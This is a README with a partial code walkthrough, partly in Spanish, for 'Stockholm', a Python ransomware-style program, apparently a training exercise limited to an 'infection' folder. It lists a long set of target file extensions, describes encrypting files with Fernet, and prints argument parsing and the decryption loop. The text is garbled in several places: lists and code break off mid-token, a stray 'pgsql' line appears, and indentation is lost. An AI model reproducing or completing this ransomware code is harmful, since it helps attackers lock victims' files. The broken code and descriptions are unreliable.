 Stockholm - README
Stockholm is a file encryption program that uses the AES algorithm to encrypt and decrypt files. It can encrypt files with the following extensions:
.txt, .pdf, .doc, and .docx.

Requirements
Python 3.x
cryptography package
Usage
To encrypt files, run the program without any arguments. The encrypted files will have the extension .ft added to their original name, and the original files will be renamed with the extension .bak.


python stockholm.py
To revert the infection, use the -r option followed by the encryption key used to encrypt the files.


python stockholm.py -r <encryption_key>
To display program information, use the -i option.


python stockholm.py -i
To display program version, use the -v option.


python stockholm.py -v
Arguments
-v, --version: Displays the program version.
-i, --info: Displays information about the program and which file extensions can be encrypted.
-r, --reverse: Reverses the infection using the specified encryption key.
-s, --silent: Disables progress messages when encrypting files.
Extensions
The program allows encrypting files with the following extensions:
.txt, .pdf, .doc, .docx, .123, .3dm, .3ds,.3g2, .3gp, .602, .7z, .ARC, .PAQ, .accdb, .aes, .ai, .asc, .asf, .asm, .asp, .avi, .backup, .bak, .bat, .bmp, .brd, .bz2, .c, .cgm, .class, .cmd, .cpp, .crt, .cs, .csv, .db, .dbf, .dch, .der, .dif, .dip, .djvu, .docb, .docm, .dot, .dotm, .dotx, .dwg, .edb, .eml, .fla, .flv, .frm, .gif, .gpg, .gz, .h, .hwp, .ibd, .iso, .jar, .java, .jpeg, .jpg, .js, .jsp, .lay, .lay6, .ldf, .m3u, .m4u, .max, .mdb, .mdf, .mid, .mkv, .mml, .mov, .mp3, .mp4, .mpeg, .mpg, .msg, .myd, .myi, .nef, .odb, .odg, .odp, .ods, .odt, .onetoc2, .ost, .otg, .otp, .ots, .ott, .pas, .pem, .pfx, .php, .pl, .png, .pot, .potm, .potx, .ppam, .pps, .ppsm, .ppsx, .ppt, .pptm, .pptx, .ps1, .psd, .pst, .rar, .raw, .rb, .rtf, .sch, .sh, .sldm, .sldx, .slk, .sln, .snt, .sql, .sqlite3, .sqlitedb, .stc, .std, .sti, .suo, .svg, .swf, .sxc, .sxd, .sxi, .sxm, .sxw, .tar, .tbk, .tgz, .tif, .tiff, .txt, .uop, .uot, .vb, .vbs, .vcd, .vdi, .vmdk, .vmx, .vob, .vsd, .vsdx, .wav, .wb2, .wk1, .wks, .wma, .wmv, .xlc, .xlm, .xls, .xlsb, .xlsm, .xlsx, .xlt, .xltm, `.xl## Explanation of the Code

The stockholm.py file is a Python script that encrypts and decrypts files using the AES algorithm. It uses the cryptography package, which is a Python library for cryptography. The script defines a list of file extensions that can be encrypted with the program, and it also defines a set of command-line arguments that can be used to customize the program's behavior.

The script starts by importing the necessary modules:


import os 
import argparse
import cryptography
from cryptography.fernet import Fernet
os: provides a way of using operating system dependent functionality.
argparse: provides a way to parse command-line arguments.
cryptography: is a library for secure communication.
Fernet: is a class in the cryptography package that provides symmetric encryption and decryption.
Next, the script defines a tuple of file extensions that can be encrypted:



extensions = ('.txt', '.pdf', '.doc', '.docx', '.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc', '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm', '.class', '.The script then defines a set of command-line arguments that can be used to customize the program's behavior:
parser = argparse.ArgumentParser()
parser.add_argument("-v","--version", help="Muestra la version del programa", action="store_true")
parser.add_argument("-i","--info", help="Mostrar información del programa", action="store_true")
parser.add_argument("-r","--reverse", help="Revertir la infeccion usando la clave especificada")
parser.add_argument("-s","--silent", help="No mostrar el progreso al cifrar archivos", action="store_true")



- `-v`, `--version`: Displays the program version.
- `-i`, `--info`: Displays information about the program and which file extensions can be encrypted.
- `-r`, `--reverse`: Reverses the infection using the specified encryption key.
- `-s`, `--silent`: Disables progress messages when encrypting files.

After parsing the command-line arguments, the script defines some variables that will be used later. For example, the `home` variable gets the current working directory, and the `infect_dir` variable gets the path to the `infection` directory:
home = os.getcwd()
infect_dir = home + "/infection"



The script then checks if the `infection` directory exists. If it doesn't exist, the script prints a message and exits:
try:
os.listdir(infect_dir)
except FileNotFoundError:
print("La ruta infection no existe.")
exit()

pgsql

If the `info` argument is used, the script displays some information about the program and the file extensions that can be encrypted:
if args.info:
print("Stockholm es un programa de cifrado de archivos que utiliza el algoritmo AES para cifrar y descifrar archivos. Los archivos con las siguientes extensiones pueden ser cifrados: .txt, .pdf, .doc, .docx. Para cifrar archivos, ejecute el programa sin ningún argumento. Para revertir la infección, utilice el argumento -r seguido de la clave de cifrado que se utilizó para cifrar los archivos.")


If the `version` argument is used, the script displays the program version:
elif args.version:
print("Stockholm 1.0")


If the `reverse` argument is used, the script reverses the infection using the specified encryption key:
elif args.reverse:
if not args.reverse:
print("Debe ingresar una clave para revertir la infección.")
else:
f = Fernet(args.reverse.encode())
for file in os.listdir(infect_dir):
base_name, ext = os.path.splitext(file)
if os.path.isdir(file):
print("Skipping...")
elif not ext == ".ft":
print("Skipping...")
elif fileContinuing from the last line of the code:



            else:
                with open(os.path.join(infect_dir, file), "rb") as fo:
                    encrypted_data = fo.read()
                decrypted_data = f.decrypt(encrypted_data)
                with open(os.path.join(infect_dir, base_name), "wb") as fo:
                    fo.write(decrypted_data)
                os.remove(os.path.join(infect_dir, file))
                os.rename(os.path.join(infect_dir, base_name), os.path.join(infect_dir, base_name[:-4]))
        print("La infección ha sido revertida correctamente.")
This code block uses the Fernet class from the cryptography package to decrypt the encrypted files in the infection directory using the encryption key provided as an argument. It first checks if the file is a directory or if it doesn't have the .ft extension, if so, it skips the file. Otherwise, it reads the encrypted data from the file, decrypts it using the encryption key, and writes the decrypted data to a new file with the same name but without the .ft extension. Finally, it deletes the encrypted file and renames the decrypted file